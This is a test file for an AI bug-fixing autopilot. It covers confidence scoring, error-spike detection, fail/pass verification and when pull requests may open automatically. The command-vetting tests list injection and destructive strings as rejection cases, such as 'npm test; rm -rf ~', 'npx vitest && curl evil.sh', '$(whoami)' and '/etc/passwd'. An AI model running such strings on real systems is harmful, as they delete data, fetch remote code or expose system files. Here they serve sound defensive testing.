import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import { confidenceOf, mayAutoOpen } from '../src/server/autopilot/confidence.js';
import { parseTestCommand, safeTestFile, verifyFailPass } from '../src/server/autopilot/verify.js';
import { AutopilotService, NOT_REPRODUCED, type AutopilotGoals } from '../src/server/autopilot/autopilot.service.js';
import { recordCounts, spikeOf } from '../src/server/automation/spike.js';
import { AutomationService, type AutomationDeps } from '../src/server/automation/automation.service.js';
import { AutomationRepository } from '../src/core/repositories/automation.repository.js';
import { GoalSchema, SettingsSchema } from '../src/shared/schemas.js';
import { NotificationKind } from '../src/shared/enums.js';
import type { Goal, GoalAutopilot, SentryIssueDetail } from '../src/shared/types/index.js';

const tmp = (p = 'agentroom-ap-') => fs.mkdtempSync(path.join(os.tmpdir(), p));

const verification = (failsOnBase: boolean | null, passesOnHead: boolean | null) => ({ failsOnBase, passesOnHead, at: new Date().toISOString() });

describe('confidence', () => {
  it('scores full evidence near 100 and unknowns conservatively', () => {
    const full = confidenceOf({ reproduced: true, verification: verification(true, true), impactModules: 1, riskScore: 0, proof: { round: 0, status: 'passed', at: '', summary: 'ok', failing: [] } });
    expect(full.score).toBe(100);
    const unknown = confidenceOf({ impactModules: null, riskScore: null });
    expect(unknown.score).toBe(3); // only "no UI to verify" partial credit
    expect(unknown.factors.filter((f) => f.ok === null).length).toBeGreaterThanOrEqual(5);
  });

  it('caps the score when the test fails on the fix or the bug was not reproduced', () => {
    expect(confidenceOf({ reproduced: true, verification: verification(true, false), impactModules: 1, riskScore: 0 }).score).toBeLessThanOrEqual(30);
    expect(confidenceOf({ reproduced: false, verification: verification(true, true), impactModules: 1, riskScore: 0 }).score).toBeLessThanOrEqual(10);
  });

  it('weighs blast radius and risk', () => {
    const base = { reproduced: true, verification: verification(true, true), riskScore: 0 };
    const small = confidenceOf({ ...base, impactModules: 1 }).score;
    const wide = confidenceOf({ ...base, impactModules: 12 }).score;
    expect(small - wide).toBe(15);
    expect(confidenceOf({ ...base, impactModules: 1, riskScore: 80 }).score).toBeLessThan(small);
  });

  it('opens a PR on its own only when the trigger, settings, score and verification all allow it', () => {
    const a = (over: Partial<GoalAutopilot>): GoalAutopilot => ({
      source: 'sentry', issueId: '1', shortId: 'WEB-1', title: 't', autoPr: true, status: 'verified',
      verification: verification(true, true), confidence: { score: 90, at: '', factors: [] }, ...over,
    });
    const on = { allowAutoPr: true, minConfidence: 80 };
    expect(mayAutoOpen(a({}), on).ok).toBe(true);
    expect(mayAutoOpen(a({ autoPr: false }), on).ok).toBe(false);
    expect(mayAutoOpen(a({}), { ...on, allowAutoPr: false }).ok).toBe(false);
    expect(mayAutoOpen(a({ confidence: { score: 79, at: '', factors: [] } }), on).ok).toBe(false);
    expect(mayAutoOpen(a({ verification: verification(false, true) }), on).ok).toBe(false);
    // Default settings never auto-open.
    expect(mayAutoOpen(a({}), SettingsSchema.parse({}).autopilot).ok).toBe(false);
  });
});

describe('spike detection', () => {
  const rule = { factor: 3, windowMin: 60, minEvents: 10 };
  const H = 60 * 60_000;
  it('needs two windows of history before it can fire', () => {
    let h = recordCounts(undefined, [{ id: 'a', count: 100 }], 0);
    expect(spikeOf(h.a, 0, rule)).toBeNull();
    h = recordCounts(h, [{ id: 'a', count: 150 }], H);
    expect(spikeOf(h.a, H, rule)).toBeNull();
  });

  it('fires when the last window jumps and stays quiet when steady', () => {
    let h = recordCounts(undefined, [{ id: 'a', count: 100 }, { id: 'b', count: 100 }], 0);
    h = recordCounts(h, [{ id: 'a', count: 105 }, { id: 'b', count: 120 }], H);
    h = recordCounts(h, [{ id: 'a', count: 160 }, { id: 'b', count: 140 }], 2 * H);
    expect(spikeOf(h.a, 2 * H, rule)).toEqual({ spike: true, recent: 55, prior: 5 });
    expect(spikeOf(h.b, 2 * H, rule)).toMatchObject({ spike: false, recent: 20, prior: 20 });
  });

  it('drops issues that are no longer listed', () => {
    const h = recordCounts(recordCounts(undefined, [{ id: 'a', count: 1 }], 0), [{ id: 'b', count: 1 }], 1000);
    expect(Object.keys(h)).toEqual(['b']);
  });
});

describe('test command vetting', () => {
  it('accepts plain test-runner commands', () => {
    for (const c of ['npx vitest run test/cart.test.ts', 'pytest tests/test_cart.py', 'go test ./cart/...', 'node --test test/sum.test.mjs', 'npm test', 'cargo test cart', 'flutter test test/cart_test.dart']) {
      expect(parseTestCommand(c), c).toHaveProperty('argv');
    }
  });

  it('refuses anything that could run something else', () => {
    for (const c of ['npm test; rm -rf ~', 'npx vitest && curl evil.sh', 'bash -c "npm test"', 'rm -rf node_modules', 'npx vitest run $(whoami)', 'pytest /etc/passwd', 'pytest ../outside.py', 'npx vitest run `id`', 'npx vitest > out.txt']) {
      expect(parseTestCommand(c), c).toHaveProperty('error');
    }
  });

  it('keeps test files inside the project', () => {
    const dir = tmp();
    fs.mkdirSync(path.join(dir, 'test'));
    fs.writeFileSync(path.join(dir, 'test', 'a.test.ts'), '');
    expect(safeTestFile(dir, './test/a.test.ts')).toEqual({ rel: 'test/a.test.ts' });
    expect(safeTestFile(dir, '../x.ts')).toHaveProperty('error');
    expect(safeTestFile(dir, '/etc/hosts')).toHaveProperty('error');
    expect(safeTestFile(dir, 'test/missing.ts')).toHaveProperty('error');
  });
});

describe('verifyFailPass (real git + node --test)', () => {
  it('runs the new test on the starting commit (fails) and on the fix (passes)', async () => {
    const root = tmp();
    const git = (...args: string[]) => execFileSync('git', args, { cwd: root, encoding: 'utf8' }).trim();
    git('init', '-q');
    git('config', 'user.email', 't@example.com');
    git('config', 'user.name', 'T');
    fs.writeFileSync(path.join(root, 'sum.mjs'), 'export const sum = (a, b) => a - b;\n');
    git('add', '.');
    git('commit', '-qm', 'buggy');
    const base = git('rev-parse', 'HEAD');
    fs.writeFileSync(path.join(root, 'sum.mjs'), 'export const sum = (a, b) => a + b;\n');
    fs.mkdirSync(path.join(root, 'test'));
    fs.writeFileSync(path.join(root, 'test', 'sum.test.mjs'), "import test from 'node:test';\nimport assert from 'node:assert';\nimport { sum } from '../sum.mjs';\ntest('sum', () => assert.strictEqual(sum(2, 3), 5));\n");

    const out = await verifyFailPass({ root, head: root, baseRef: base, test: { file: 'test/sum.test.mjs', command: 'node --test test/sum.test.mjs' }, scratchDir: path.join(tmp(), 'base') });
    expect(out).toMatchObject({ failsOnBase: true, passesOnHead: true });

    // A test that doesn't catch the bug passes on the starting commit too.
    fs.writeFileSync(path.join(root, 'test', 'weak.test.mjs'), "import test from 'node:test';\ntest('nothing', () => {});\n");
    const weak = await verifyFailPass({ root, head: root, baseRef: base, test: { file: 'test/weak.test.mjs', command: 'node --test test/weak.test.mjs' }, scratchDir: path.join(tmp(), 'base') });
    expect(weak).toMatchObject({ failsOnBase: false, passesOnHead: true });
    expect(weak.detail).toMatch(/does not catch the bug/);
  }, 30_000);

  it('never runs a command that is not a vetted test runner', async () => {
    let ran = false;
    const out = await verifyFailPass({ root: '/', head: '/', baseRef: 'x', test: { file: 'a', command: 'npm test; touch /tmp/pwned' }, scratchDir: '/tmp/x', run: async () => ((ran = true), { code: 0, tail: '' }) });
    expect(ran).toBe(false);
    expect(out).toMatchObject({ failsOnBase: null, passesOnHead: null });
  });
});

// ---------- AutopilotService ----------

function goalOf(id: string, over: Partial<Goal> = {}): Goal {
  const now = new Date().toISOString();
  return GoalSchema.parse({ id, title: id, brief: 'b', createdAt: now, updatedAt: now, ...over });
}

const detail = (id: string): SentryIssueDetail =>
  ({
    issue: { id, shortId: `WEB-${id}`, title: 'TypeError: cart is undefined', level: 'error', project: { slug: 'web' }, count: 10, userCount: 3, firstSeen: '2026-10-20T00:00:00Z', lastSeen: '2026-10-20T01:00:00Z', permalink: `https://sentry.io/issues/${id}`, culprit: 'cart.ts' },
    event: { exceptions: [], breadcrumbs: [], contexts: [], message: 'cart is undefined' },
  }) as unknown as SentryIssueDetail;

function autopilotHarness(opts: { settings?: object; verify?: ConstructorParameters<typeof AutopilotService>[0]['verify'] } = {}) {
  const goals = new Map<string, Goal>();
  const notes: { kind: string; title: string }[] = [];
  const prs: string[] = [];
  const audits: string[] = [];
  const g: AutopilotGoals = {
    list: () => [...goals.values()],
    get: (id) => goals.get(id),
    start: (brief, title, sources, t) => {
      const goal = goalOf(`G-${goals.size + 1}`, { brief, title, sources, baseRef: 'base', ...(t ? { template: { id: t.id, name: t.name }, guidance: t.guidance } : {}) });
      goals.set(goal.id, goal);
      return goal;
    },
    update: (id, patch) => {
      const next = GoalSchema.parse({ ...goals.get(id)!, ...patch });
      goals.set(id, next);
      return next;
    },
    changedFiles: async () => ['src/cart.ts'],
    cwdOf: () => '/tmp',
    openPr: async (id) => {
      prs.push(id);
      return g.update(id, {});
    },
    isRunning: () => false,
  };
  const svc = new AutopilotService({
    root: '/tmp',
    goals: () => g,
    detail: async (id) => detail(id),
    template: () => ({ id: 'reproduce-first', name: 'Reproduce-first fix', description: '', order: 5, fields: [], guidance: 'Reproduce first.' }),
    bots: () => [],
    settings: () => SettingsSchema.parse(opts.settings ?? {}),
    notify: (n) => void notes.push(n),
    audit: (e) => void audits.push(e.summary),
    impact: () => 1,
    scratchDir: tmp(),
    ...(opts.verify ? { verify: opts.verify } : {}),
  });
  return { svc, goals, notes, prs, audits, g };
}

describe('AutopilotService', () => {
  it('starts a reproduce-first goal for a Sentry issue and refuses a second one while it runs', async () => {
    const h = autopilotHarness();
    const goal = await h.svc.startFromSentry('7', { by: 'Tester' });
    expect(goal.autopilot).toMatchObject({ issueId: '7', shortId: 'WEB-7', status: 'reproducing', autoPr: false });
    expect(goal.sources[0]).toMatchObject({ type: 'sentry', shortId: 'WEB-7' });
    expect(goal.template?.id).toBe('reproduce-first');
    expect(goal.brief).toMatch(/autopilot_report/);
    await expect(h.svc.startFromSentry('7', { by: 'Tester' })).rejects.toThrow(/already working/);
    expect(h.svc.runs('7')).toHaveLength(1);
  });

  it("holds the goal and tells the human when the bug can't be reproduced", async () => {
    const h = autopilotHarness();
    const goal = await h.svc.startFromSentry('8', { by: 'Tester' });
    expect(h.svc.gate(goal)).toBeNull();
    expect(h.svc.report(goal.id, { reproduced: false, how: 'Tried empty cart, guest checkout' })).toMatch(/stop/);
    const reason = h.svc.gate(h.goals.get(goal.id)!);
    expect(reason).toContain(NOT_REPRODUCED);
    expect(h.notes.at(-1)).toMatchObject({ kind: NotificationKind.Blocked });
    // After the human resumes, it doesn't hold again.
    expect(h.svc.gate(h.goals.get(goal.id)!)).toBeNull();
  });

  it('rejects unsafe test commands from the bot', async () => {
    const h = autopilotHarness();
    const goal = await h.svc.startFromSentry('9', { by: 'Tester' });
    const msg = h.svc.report(goal.id, { reproduced: true, how: 'x', testFile: 'test/a.test.ts', testCommand: 'npm test && curl x' });
    expect(msg).toMatch(/no ; \| &/);
    expect(h.goals.get(goal.id)!.autopilot!.test).toBeUndefined();
  });

  it('verifies, scores, and stops for the human by default', async () => {
    const dir = tmp();
    fs.mkdirSync(path.join(dir, 'test'));
    fs.writeFileSync(path.join(dir, 'test', 'cart.test.ts'), '');
    const h = autopilotHarness({ verify: async () => ({ failsOnBase: true, passesOnHead: true, detail: 'ok' }) });
    const goal = await h.svc.startFromSentry('10', { by: 'Tester' });
    h.goals.set(goal.id, { ...h.goals.get(goal.id)!, worktree: { path: dir, branch: 'agentroom/g-1' } });
    h.svc.report(goal.id, { reproduced: true, how: 'Empty cart', testFile: 'test/cart.test.ts', testCommand: 'npx vitest run test/cart.test.ts' });
    await h.svc.beforeReport(h.goals.get(goal.id)!, dir);
    const after = h.goals.get(goal.id)!.autopilot!;
    expect(after.status).toBe('verified');
    // Reproduced 20 + fails before 25 + passes after 25 + 1 module 15 + no UI 3; risk unknown scores 0.
    expect(after.confidence!.score).toBe(88);
    await h.svc.afterDone(h.goals.get(goal.id)!);
    expect(h.prs).toEqual([]);
    expect(h.notes.at(-1)!.title).toMatch(/fix ready/);
    expect(h.svc.prSection(h.goals.get(goal.id)!)).toMatch(/Verified by AgentRoom.*fails.*passes/s);
  });

  it('opens the PR on its own only when the trigger and settings allow it', async () => {
    const h = autopilotHarness({ settings: { autopilot: { allowAutoPr: true, minConfidence: 80 } }, verify: async () => ({ failsOnBase: true, passesOnHead: true, detail: 'ok' }) });
    const dir = tmp();
    fs.writeFileSync(path.join(dir, 'a.test.ts'), '');
    const goal = await h.svc.startFromSentry('11', { by: 'automation', triggerId: 'T-1', autoPr: true });
    h.goals.set(goal.id, { ...h.goals.get(goal.id)!, worktree: { path: dir, branch: 'b' } });
    h.svc.report(goal.id, { reproduced: true, how: 'x', testFile: 'a.test.ts', testCommand: 'npx vitest run a.test.ts' });
    await h.svc.beforeReport(h.goals.get(goal.id)!, dir);
    await h.svc.afterDone(h.goals.get(goal.id)!);
    expect(h.prs).toEqual([goal.id]);
    expect(h.goals.get(goal.id)!.autopilot!.status).toBe('pr_opened');
    expect(h.audits.at(-1)).toMatch(/Autopilot opened/);
  });

  it('does not auto-open when the test fails on the fix', async () => {
    const h = autopilotHarness({ settings: { autopilot: { allowAutoPr: true, minConfidence: 50 } }, verify: async () => ({ failsOnBase: true, passesOnHead: false, detail: 'x' }) });
    const dir = tmp();
    fs.writeFileSync(path.join(dir, 'a.test.ts'), '');
    const goal = await h.svc.startFromSentry('12', { by: 'automation', triggerId: 'T-1', autoPr: true });
    h.goals.set(goal.id, { ...h.goals.get(goal.id)!, worktree: { path: dir, branch: 'b' } });
    h.svc.report(goal.id, { reproduced: true, how: 'x', testFile: 'a.test.ts', testCommand: 'npx vitest run a.test.ts' });
    await h.svc.beforeReport(h.goals.get(goal.id)!, dir);
    expect(h.goals.get(goal.id)!.autopilot!.status).toBe('unverified');
    await h.svc.afterDone(h.goals.get(goal.id)!);
    expect(h.prs).toEqual([]);
  });
});

// ---------- automation: autopilot + spike triggers ----------

function automation(over: Partial<AutomationDeps>) {
  const dir = tmp('agentroom-ap-auto-');
  let now = new Date(2026, 9, 20, 10, 0);
  const deps: AutomationDeps = {
    repo: new AutomationRepository(
      { schedules: path.join(dir, 's.json'), triggers: path.join(dir, 't.json'), personalSchedules: path.join(dir, 'runs', 's.json'), personalTriggers: path.join(dir, 'runs', 't.json') },
      () => ({ name: 'Tester', email: 't@example.com' }),
    ),
    stateFile: path.join(dir, 'state.json'),
    historyFile: path.join(dir, 'history.jsonl'),
    pushState: () => {},
    isActive: () => false,
    startGoal: () => goalOf('G-x'),
    approvePlan: () => {},
    goals: () => [],
    sendToBot: () => {},
    handoff: async () => ({ botId: 'lead' }),
    notify: () => {},
    notifications: () => [],
    pendingApprovals: () => 0,
    ledgerSince: () => [],
    spentToday: () => 0,
    settings: () => SettingsSchema.parse({}),
    webhook: () => undefined,
    projectName: 'demo',
    url: () => 'http://localhost',
    audit: () => {},
    human: () => 'Tester',
    now: () => now,
    ...over,
  };
  return { svc: new AutomationService(deps), setNow: (d: Date) => (now = d), now: () => now };
}

describe('autopilot triggers', () => {
  it('starts autopilot for new Sentry issues, passing the trigger and auto-PR flag', async () => {
    let issues = [{ id: '1', shortId: 'WEB-1', title: 'Old', level: 'error', project: { slug: 'web' } }];
    const started: { id: string; autoPr: boolean; triggerId: string }[] = [];
    const h = automation({
      sentryIssues: async () => issues,
      startAutopilot: async (id, o) => (started.push({ id, autoPr: o.autoPr, triggerId: o.triggerId }), goalOf('G-1')),
    });
    const t = h.svc.createTrigger({ name: 'Autopilot errors', when: { source: 'sentry', event: 'new_issue', level: 'error' }, then: { type: 'autopilot', planOnly: true, autoPr: true }, limits: { maxRunsPerDay: 3 } });
    await h.svc.poll();
    issues = [{ id: '2', shortId: 'WEB-2', title: 'New', level: 'fatal', project: { slug: 'web' } }, ...issues];
    await h.svc.poll();
    expect(started).toEqual([{ id: '2', autoPr: true, triggerId: t.id }]);
    expect(h.svc.historyList()[0]).toMatchObject({ outcome: 'started', goalId: 'G-1' });
  });

  it('refuses autopilot on non-Sentry sources', () => {
    const h = automation({});
    expect(() => h.svc.createTrigger({ name: 'x', when: { source: 'goal', event: 'failed' }, then: { type: 'autopilot', planOnly: true }, limits: { maxRunsPerDay: 1 } })).toThrow(/Sentry/);
  });

  it('fires a spike trigger once per day per issue', async () => {
    let count = 100;
    const fired: string[] = [];
    const h = automation({
      sentryIssues: async (o) => (o?.sort === 'date' ? [{ id: '5', shortId: 'WEB-5', title: 'Timeouts', level: 'error', project: { slug: 'web' }, count }] : []),
      startAutopilot: async (id) => (fired.push(id), goalOf('G-5')),
    });
    h.svc.createTrigger({ name: 'Spikes', when: { source: 'sentry', event: 'spike', spike: { factor: 3, windowMin: 60, minEvents: 10 } }, then: { type: 'autopilot', planOnly: true }, limits: { maxRunsPerDay: 5 } });
    const at = (min: number) => h.setNow(new Date(2026, 9, 20, 10, min));
    await h.svc.poll(); // 10:00 → 100
    at(60); count = 104; await h.svc.poll(); // 11:00
    expect(fired).toEqual([]);
    h.setNow(new Date(2026, 9, 20, 12, 0)); count = 150; await h.svc.poll();
    expect(fired).toEqual(['5']);
    h.setNow(new Date(2026, 9, 20, 12, 5)); count = 220; await h.svc.poll();
    expect(fired).toEqual(['5']);
  });
});
